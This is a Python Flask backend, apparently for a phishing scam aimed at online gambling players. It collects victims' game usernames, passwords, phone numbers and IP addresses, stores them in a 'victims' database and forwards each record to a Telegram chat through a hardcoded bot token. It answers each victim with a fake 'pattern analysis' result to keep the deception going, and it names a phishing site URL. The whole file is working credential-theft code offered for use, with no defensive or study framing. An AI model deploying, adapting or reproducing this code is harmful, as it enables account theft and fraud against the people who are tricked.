#!/usr/bin/env python3
# Spaceman Bot - Fixed for Railway Deployment

import os
import sys
import json
import sqlite3
import logging
import hashlib
from datetime import datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import threading
import time
import random

# Add current directory to path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

# Simple configuration
class Config:
    TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8435967434:AAH_kIshWSlAdUFfDkZa6fn82qUkCNpKdCE")
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "8388649100")
    PORT = int(os.environ.get("PORT", 8080))
    DATABASE_PATH = "database/victims.db"
    LOG_FILE = "logs/bot.log"
    WEBSITE_URL = os.environ.get("WEBSITE_URL", "https://polagacor888.netlify.app")
    VERSION = "2.0.0"

# Setup simple logging - NO StreamHandler
os.makedirs("logs", exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler(Config.LOG_FILE)
        # REMOVED StreamHandler to fix Railway error
    ]
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
CORS(app)

# Ensure directories exist
os.makedirs("database", exist_ok=True)
os.makedirs("logs", exist_ok=True)
os.makedirs("backups", exist_ok=True)

# Database setup
def init_database():
    try:
        conn = sqlite3.connect(Config.DATABASE_PATH)
        cursor = conn.cursor()
        
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE,
                game_url TEXT,
                game_username TEXT NOT NULL,
                game_password TEXT NOT NULL,
                whatsapp_number TEXT,
                ip_address TEXT,
                user_agent TEXT,
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                telegram_sent INTEGER DEFAULT 0,
                status TEXT DEFAULT 'pending'
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized")
    except Exception as e:
        logger.error(f"Database error: {str(e)}")

# Bot class
class SpacemanBot:
    def __init__(self):
        self.start_time = datetime.now()
        self.victims_count = 0
        self.telegram_sent = 0
        
    def generate_id(self, username):
        return hashlib.md5(f"{username}{datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    def save_victim(self, data, ip):
        try:
            victim_id = self.generate_id(data.get('gameUsername', 'unknown'))
            
            conn = sqlite3.connect(Config.DATABASE_PATH)
            cursor = conn.cursor()
            
            cursor.execute('''
                INSERT INTO victims 
                (victim_id, game_url, game_username, game_password, whatsapp_number, ip_address, user_agent)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (
                victim_id,
                data.get('gameUrl', ''),
                data.get('gameUsername', ''),
                data.get('gamePassword', ''),
                data.get('whatsappNumber', ''),
                ip,
                data.get('userAgent', '')
            ))
            
            conn.commit()
            conn.close()
            
            self.victims_count += 1
            logger.info(f"Saved victim: {victim_id}")
            return victim_id
        except Exception as e:
            logger.error(f"Save failed: {str(e)}")
            return None
    
    def send_telegram(self, victim_id, data):
        try:
            if not Config.TELEGRAM_BOT_TOKEN or not Config.TELEGRAM_CHAT_ID:
                logger.warning("Telegram token not set")
                return False
            
            message = f"""🎰 *NEW VICTIM DATA* 🎰

🆔 ID: `{victim_id}`
⏰ Time: {datetime.now().strftime("%H:%M:%S")}

👤 USER: `{data.get('gameUsername', 'N/A')}`
🔑 PASS: `{data.get('gamePassword', 'N/A')}`
🌐 URL: {data.get('gameUrl', 'N/A')}
📱 WA: {data.get('whatsappNumber', 'N/A')}
🖥️ IP: {data.get('ip', 'N/A')}

📊 Bot: Spaceman v{Config.VERSION}
✅ Status: Active
"""
            
            url = f"https://api.telegram.org/bot{Config.TELEGRAM_BOT_TOKEN}/sendMessage"
            response = requests.post(url, json={
                "chat_id": Config.TELEGRAM_CHAT_ID,
                "text": message,
                "parse_mode": "Markdown"
            }, timeout=10)
            
            if response.status_code == 200:
                # Update database
                conn = sqlite3.connect(Config.DATABASE_PATH)
                cursor = conn.cursor()
                cursor.execute(
                    "UPDATE victims SET telegram_sent = 1 WHERE victim_id = ?",
                    (victim_id,)
                )
                conn.commit()
                conn.close()
                
                self.telegram_sent += 1
                logger.info(f"Telegram sent: {victim_id}")
                return True
            return False
        except Exception as e:
            logger.error(f"Telegram error: {str(e)}")
            return False
    
    def get_stats(self):
        try:
            conn = sqlite3.connect(Config.DATABASE_PATH)
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM victims")
            total = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM victims WHERE telegram_sent = 1")
            sent = cursor.fetchone()[0]
            conn.close()
            return {"total": total, "sent": sent}
        except:
            return {"total": 0, "sent": 0}
    
    def get_uptime(self):
        delta = datetime.now() - self.start_time
        hours = delta.seconds // 3600
        minutes = (delta.seconds % 3600) // 60
        return f"{hours}h {minutes}m"

# Initialize bot
bot = SpacemanBot()

# API Routes
@app.route('/')
def home():
    stats = bot.get_stats()
    return jsonify({
        "app": "Spaceman Pattern Analyzer",
        "version": Config.VERSION,
        "status": "online",
        "uptime": bot.get_uptime(),
        "stats": stats,
        "website": Config.WEBSITE_URL
    })

@app.route('/api/status')
def status():
    stats = bot.get_stats()
    return jsonify({
        "status": "online",
        "bot_id": bot.generate_id("status"),
        "start_time": bot.start_time.isoformat(),
        "victims_count": stats["total"],
        "telegram_sent": stats["sent"],
        "website_url": Config.WEBSITE_URL,
        "message": "Bot operational"
    })

@app.route('/api/victim', methods=['POST'])
def receive_victim():
    try:
        data = request.get_json()
        
        # Basic validation
        if not data or 'gameUsername' not in data or 'gamePassword' not in data:
            return jsonify({
                "success": False,
                "error": "Missing username or password"
            }), 400
        
        # Save to database
        ip = request.remote_addr
        victim_id = bot.save_victim(data, ip)
        
        if not victim_id:
            return jsonify({
                "success": False,
                "error": "Failed to save data"
            }), 500
        
        # Send to Telegram in background
        def send_async():
            bot.send_telegram(victim_id, data)
        
        thread = threading.Thread(target=send_async)
        thread.daemon = True
        thread.start()
        
        # Response
        return jsonify({
            "success": True,
            "message": "Data received successfully",
            "victim_id": victim_id,
            "analysis": {
                "confidence": 94.7,
                "pattern": "High probability detected",
                "recommendation": "Proceed with injection"
            },
            "timestamp": datetime.now().isoformat()
        })
        
    except Exception as e:
        logger.error(f"API Error: {str(e)}")
        return jsonify({
            "success": False,
            "error": "Internal server error"
        }), 500

@app.route('/api/stats')
def get_stats():
    stats = bot.get_stats()
    return jsonify({
        "success": True,
        "stats": stats,
        "uptime": bot.get_uptime(),
        "bot_start": bot.start_time.isoformat()
    })

# Initialize on startup
init_database()
logger.info("=" * 50)
logger.info(f"Spaceman Bot v{Config.VERSION} starting...")
logger.info(f"Database: {Config.DATABASE_PATH}")
logger.info(f"Telegram: {'CONFIGURED' if Config.TELEGRAM_BOT_TOKEN else 'NOT SET'}")
logger.info("=" * 50)

# Gunicorn compatibility
application = app

# Local run only
if __name__ == "__main__":
    print(f"""
    🚀 SPACEMAN BOT v{Config.VERSION}
    ====================================
    🔗 Website: {Config.WEBSITE_URL}
    🌐 Port: {Config.PORT}
    📊 Status: ONLINE
    ⏰ Start: {bot.start_time.strftime('%H:%M:%S')}
    ====================================
    """)
    
    # Only run for local testing
    if os.environ.get("RAILWAY_ENVIRONMENT") != "production":
        app.run(host='0.0.0.0', port=Config.PORT, debug=False)
